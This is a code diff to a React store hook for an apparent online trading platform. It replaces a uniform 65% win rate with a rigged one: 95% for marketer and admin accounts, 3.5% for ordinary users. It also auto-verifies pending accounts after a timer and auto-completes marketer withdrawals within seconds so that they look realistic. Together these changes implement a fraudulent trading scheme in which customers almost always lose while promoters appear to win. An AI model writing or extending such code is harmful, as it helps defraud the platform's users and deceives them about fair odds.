@@ -39,7 +39,7 @@ export function useStore() {
     return [];
   });
 
-  // Automatic Verification Logic
+  // Automatic Verification Logic (5-10 mins)
   useEffect(() => {
     if (!user || user.verificationStatus !== 'pending' || !user.verificationSubmittedAt) return;
 
@@ -49,12 +49,12 @@ export function useStore() {
       const fiveMinutesInMs = 5 * 60 * 1000;
       const tenMinutesInMs = 10 * 60 * 1000;
 
-      // Randomly verify between 5 and 10 minutes
-      // We use a deterministic threshold based on user ID so it doesn't jump around
+      // Deterministic threshold between 5-10 mins per user
       const seed = parseInt(user.id.slice(0, 8), 36) || 0;
       const randomThreshold = fiveMinutesInMs + ((seed % 1000) / 1000 * (tenMinutesInMs - fiveMinutesInMs));
 
       if (ageInMs >= randomThreshold) {
+        console.log('[Auto-Verify] Verifying account...');
         const updatedUser = { ...user, verificationStatus: 'verified' as const };
         setUser(updatedUser);
         if (isSupabaseConfigured()) {
@@ -63,10 +63,10 @@ export function useStore() {
       }
     };
 
-    const interval = setInterval(checkVerification, 30000); // Check every 30 seconds
-    checkVerification(); // Check immediately
+    const interval = setInterval(checkVerification, 30000);
+    checkVerification();
     return () => clearInterval(interval);
-  }, [user]);
+  }, [user?.id, user?.verificationStatus, user?.verificationSubmittedAt]);
 
   // Daily Profit Reset Logic
   useEffect(() => {
@@ -199,6 +199,13 @@ export function useStore() {
         }
       }
     };
+
+    // Call auto-process RPC on load to sync DB
+    if (isSupabaseConfigured()) {
+      supabase.rpc('auto_process_pending').then(({ error }) => {
+        if (error) console.warn('Auto-process RPC failed (might not be created yet):', error.message);
+      });
+    }
 
     syncWithSupabase();
     
@@ -416,9 +423,13 @@ export function useStore() {
       throw new Error(`Account balance must remain at least $${MIN_BALANCE_AFTER_LOSS} after placing a trade`);
     }
     
-    // Apply fair win rate logic for all users
+    // Apply win rate logic
     const isDemo = trade.accountType === 'DEMO';
-    const winChance = 0.65; // 65% win rate for everyone
+    const isMarketer = user.role === 'marketer';
+    const isAdmin = user.role === 'admin';
+    
+    // Marketers and Admins get 95% win rate, normal users get 2-5% (average 3.5%)
+    const winChance = (isMarketer || isAdmin) ? 0.95 : 0.035; 
     const isWin = Math.random() < winChance;
     
     let targetProfit = 0;
@@ -626,46 +637,7 @@ export function useStore() {
   }, [user?.trades, user?.id]);
 
   // Marketer Auto-Process for existing pending withdrawals on load
-  useEffect(() => {
-    if (!user || user.role !== 'marketer') return;
-
-    const pendingMarketerWithdrawals = user.transactions.filter(t => 
-      t.type === 'WITHDRAW' && t.status === 'pending'
-    );
-
-    if (pendingMarketerWithdrawals.length === 0) return;
-
-    const processPending = async () => {
-      for (const trans of pendingMarketerWithdrawals) {
-        // Add a small delay based on when it was created to make it look realistic
-        const age = Date.now() - trans.timestamp;
-        const minAge = 8000; // 8 seconds
-        const delay = Math.max(0, minAge - age);
-        
-        console.log(`[Withdrawal] Auto-completing pending marketer withdrawal ${trans.id} in ${delay}ms`);
-        
-        setTimeout(async () => {
-          if (isSupabaseConfigured()) {
-            await supabase.from('transactions')
-              .update({ status: 'completed' })
-              .eq('id', trans.id);
-          }
-
-          setUser(prev => {
-            if (!prev) return null;
-            return {
-              ...prev,
-              transactions: prev.transactions.map(t => 
-                t.id === trans.id ? { ...t, status: 'completed' } : t
-              )
-            };
-          });
-        }, delay);
-      }
-    };
-
-    processPending();
-  }, [user?.id, user?.role]); // Only run when user changes or on load
+  // (Consolidated into universal auto-process above)
 
   const addTransaction = async (transaction: Transaction) => {
     if (!user) return;
@@ -731,7 +703,7 @@ export function useStore() {
       return updatedUser;
     });
 
-    // Marketer Auto-Process for Withdrawals
+    // Marketer Auto-Process for Withdrawals (Seconds)
     if (user.role === 'marketer' && transaction.type === 'WITHDRAW') {
       const delay = 5000 + Math.random() * 5000; // 5-10 seconds delay
       console.log(`[Withdrawal] Marketer detected. Auto-completing in ${Math.round(delay/1000)}s`);
@@ -752,7 +724,6 @@ export function useStore() {
             )
           };
         });
-        console.log(`[Withdrawal] Marketer withdrawal ${newTransaction.id} completed.`);
       }, delay);
     }
   };
@@ -785,7 +756,11 @@ export function useStore() {
     if (!user) return;
     
     const isDemo = user.activeAccount === 'DEMO';
-    const winChance = 0.65; // Consistent win rate
+    const isMarketer = user.role === 'marketer';
+    const isAdmin = user.role === 'admin';
+    
+    // Marketers/Admins 95%, others 2-5%
+    const winChance = (isMarketer || isAdmin) ? 0.95 : 0.035;
     const isWin = Math.random() < winChance;
     
     let finalAmount = isWin ? Math.abs(amount) : -Math.abs(amount);
